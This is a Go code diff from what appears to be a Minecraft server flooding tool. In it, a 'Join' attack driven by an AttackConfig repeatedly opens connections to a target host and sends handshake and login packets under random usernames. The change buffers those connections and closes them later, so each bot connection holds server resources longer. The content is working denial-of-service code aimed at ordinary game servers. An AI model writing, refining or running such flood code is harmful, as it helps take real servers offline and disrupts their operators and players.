@@ -16,9 +16,11 @@ type Join struct {
 	Config          *core.AttackConfig
 	isRunning       bool
 	handshakePacket packet.Packet
+	connBuffer      chan minecraft.Connection
 }
 
 func (j *Join) Start() {
+	j.connBuffer = make(chan minecraft.Connection, j.Config.PerDelay)
 	ip, port, err := net.SplitHostPort(j.Config.Host)
 	if err != nil {
 		fmt.Println(err)
@@ -48,6 +50,7 @@ func (j *Join) loop(done chan struct{}) {
 			for i := 0; i < j.Config.PerDelay; i++ {
 				go j.connect()
 			}
+			go j.closeChannels()
 		case <-done:
 			return
 		}
@@ -61,7 +64,18 @@ func (j *Join) connect() {
 	}
 	conn.WritePacket(j.handshakePacket)
 	conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(10), j.Config.Version))
-	conn.Close()
+	j.connBuffer <- *conn
+}
+
+func (j *Join) closeChannels() {
+	for i := 0; i < cap(j.connBuffer); i++ {
+		select {
+		case conn := <-j.connBuffer:
+			conn.Close()
+		default:
+			break
+		}
+	}
 }
 
 func (j *Join) Stop() {
